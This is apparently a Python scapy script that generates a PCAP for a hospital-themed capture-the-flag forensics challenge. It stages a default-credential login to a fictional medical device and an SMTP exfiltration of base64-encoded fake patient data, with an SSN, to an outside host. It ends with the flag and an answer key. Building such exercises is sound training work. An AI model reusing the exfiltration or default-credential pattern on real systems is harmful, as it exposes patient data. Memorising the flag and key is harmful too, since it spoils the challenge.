#!/usr/bin/env python3

# Alternative approach that avoids routing table issues
import sys
import os

# Set environment before any scapy imports
os.environ['SCAPY_USE_PCAPDNET'] = '0'

# Import only what we need
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.packet import Raw
from scapy.utils import wrpcap
import base64
import random

# Create packets for hospital network traffic
packets = []

# Add lots of normal traffic as noise (makes it harder to find the flag)
for i in range(20):
    # Random HTTP requests
    packets.append(IP(src=f"192.168.10.{random.randint(10,50)}", dst="192.168.10.100")/TCP(sport=random.randint(1024,65535), dport=80)/Raw(load=f"GET /page{i}.html HTTP/1.1\r\nHost: Saintconhospital-portal\r\n\r\n"))
    
    # Random DNS queries
    packets.append(IP(src=f"192.168.10.{random.randint(10,50)}", dst="8.8.8.8")/UDP(sport=random.randint(1024,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=f"server{i}.saintconhospital.org")))

# Some normal hospital system traffic
packets.append(IP(src="192.168.10.20", dst="192.168.10.100")/TCP(sport=5678, dport=443)/Raw(load="GET /ehr/login HTTP/1.1\r\nHost: ehr.saintconhospital.org\r\n\r\n"))

# Normal database queries
packets.append(IP(src="192.168.10.35", dst="192.168.10.200")/TCP(sport=3456, dport=3306)/Raw(load="SELECT * FROM appointments WHERE date='2025-10-21'"))

# DNS query for the medical device
packets.append(IP(src="192.168.10.15", dst="8.8.8.8")/UDP(sport=53215, dport=53)/DNS(rd=1, qd=DNSQR(qname="medicore-pm-311.saintconhospital.org")))

# MEDICAL DEVICE TRAFFIC - Failed login attempt
failed_login_post = """POST /admin/login HTTP/1.1\r\nHost: 192.168.100.50\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\nusername=admin&password=password"""

packets.append(IP(src="192.168.10.25", dst="192.168.100.50")/TCP(sport=2100, dport=80)/Raw(load=failed_login_post))

# Response: Login failed
failed_response = """HTTP/1.1 401 Unauthorized\r\nContent-Type: text/html\r\nContent-Length: 45\r\n\r\n<html><body>Invalid credentials</body></html>"""
packets.append(IP(src="192.168.100.50", dst="192.168.10.25")/TCP(sport=80, dport=2100)/Raw(load=failed_response))

# MEDICAL DEVICE TRAFFIC - Successful login with default creds
successful_login_post = """POST /admin/login HTTP/1.1\r\nHost: 192.168.100.50\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\nusername=admin&password=medicore123"""

packets.append(IP(src="192.168.10.25", dst="192.168.100.50")/TCP(sport=2101, dport=80)/Raw(load=successful_login_post))

# Response: Login successful with session cookie
success_response = """HTTP/1.1 200 OK\r\nSet-Cookie: session=abc123def456; Path=/admin\r\nContent-Type: text/html\r\nContent-Length: 85\r\n\r\n<html><body>Welcome to MediCore PM-2024 Admin Panel - Room 311</body></html>"""
packets.append(IP(src="192.168.100.50", dst="192.168.10.25")/TCP(sport=80, dport=2101)/Raw(load=success_response))

# MEDICAL DEVICE TRAFFIC - Accessing patient data
patient_data_request = """GET /admin/patient_data?room=311 HTTP/1.1\r\nHost: 192.168.100.50\r\nCookie: session=abc123def456\r\n\r\n"""

packets.append(IP(src="192.168.10.25", dst="192.168.100.50")/TCP(sport=2102, dport=80)/Raw(load=patient_data_request))

# Response: Patient data (this could contain clues about being compromised)
patient_response = """HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 180\r\n\r\n{"patient_id":"VIP-7741","name":"ELIZABETH HARTWELL","room":"311","vitals":{"hr":78,"bp":"140/90","temp":98.6},"alerts":["UNAUTHORIZED_ACCESS_DETECTED"],"device":"MediCore PM-2024"}"""
packets.append(IP(src="192.168.100.50", dst="192.168.10.25")/TCP(sport=80, dport=2102)/Raw(load=patient_response))

# MEDICAL DEVICE TRAFFIC - Accessing debug logs (shows vulnerability)
debug_request = """GET /admin/debug/logs HTTP/1.1\r\nHost: 192.168.100.50\r\nCookie: session=abc123def456\r\n\r\n"""

packets.append(IP(src="192.168.10.25", dst="192.168.100.50")/TCP(sport=2103, dport=80)/Raw(load=debug_request))

# Debug response showing default credentials in logs
debug_response = """HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 145\r\n\r\n[2025-10-22 14:25:33] LOGIN_ATTEMPT: admin/password - FAILED\r\n[2025-10-22 14:25:41] LOGIN_ATTEMPT: admin/MediCore PM-2024 - SUCCESS\r\n[2025-10-22 14:25:42] WARNING: Using default credentials detected on https://dmburl.github.io/HCHCTF1/Challenge9/challenge9.html"""
packets.append(IP(src="192.168.100.50", dst="192.168.10.25")/TCP(sport=80, dport=2103)/Raw(load=debug_response))

# Additional medical device traffic - Device announcement/discovery
device_announce = """HTTP/1.1 200 OK\r\nServer: MediCore-PM/27\r\nContent-Type: text/html\r\nContent-Length: 120\r\n\r\n<html><head><title>MediCore Patient Monitor - Room 311</title></head><body>Device Status: Online</body></html>"""
packets.append(IP(src="192.168.100.50", dst="192.168.10.15")/TCP(sport=80, dport=1235)/Raw(load=device_announce))

# THE SUSPICIOUS SMTP TRAFFIC - Hidden in all the noise
patient_data = """PATIENT: ELIZABETH HARTWELL
MRN: VIP-7741
SSN: 987-88-4892
DIAGNOSIS: High blood pressure, posterior articulatio genus dextra pain
FLAG{patient_data_exfiltrated_via_smtp}
Room: 311"""

encoded_data = base64.b64encode(patient_data.encode()).decode()
smtp_data = f"MAIL FROM: liz@saintconhospital.org\r\nRCPT TO: scientificlasagna@gmail.com\r\nDATA\r\nSubject: System Backup\r\n\r\n{encoded_data}\r\n.\r\nQUIT\r\n"

packets.append(IP(src="192.168.10.25", dst="203.0.113.50")/TCP(sport=2345, dport=25)/Raw(load=smtp_data))

# More normal traffic after the suspicious packet
for i in range(10):
    packets.append(IP(src=f"192.168.10.{random.randint(10,50)}", dst="192.168.10.150")/TCP(sport=random.randint(1024,65535), dport=443)/Raw(load=f"POST /api/vitals HTTP/1.1\r\n\r\n"))

# HTTP POST with patient data (alternative hiding spot)
http_post = """POST /api/backup HTTP/1.1\r\nHost: backup-server.saintconhospital.org\r\nContent-Type: application/json\r\nContent-Length: 150\r\n\r\n{"backup_type": "patient_records", "room": "311", "data": "FLAG{patient_data_exfiltrated_via_smtp}", "timestamp": "2025-10-21T14:30:00Z"}"""

packets.append(IP(src="192.168.10.30", dst="198.51.100.25")/TCP(sport=3456, dport=80)/Raw(load=http_post))

# FTP data transfer
ftp_data = "227 Entering Passive Mode (192,168,10,50,20,21)\r\npatient_export.csv contains: FLAG{patient_data_exfiltrated_via_smtp}\r\n"
packets.append(IP(src="192.168.10.50", dst="192.168.10.15")/TCP(sport=21, dport=4567)/Raw(load=ftp_data))

# Write PCAP file
wrpcap("Challenge8_hospital_network_traffic.pcap", packets)
print("PCAP file created: Challenge8_hospital_network_traffic.pcap")
print(f"Total packets created: {len(packets)}")
print("\nKey findings participants should discover:")
print("- Medical device at 192.168.100.50 (MediCore PM-2024)")
print("- Default credentials: admin/MediCore PM-2024")
print("- Device serves Room 311 (connecting to earlier challenges)")
print("- Patient VIP-7741 (ELIZABETH HARTWELL) data accessible")
print("- Debug logs show security vulnerabilities")
print("- SMTP exfiltration with flag in base64 encoded data")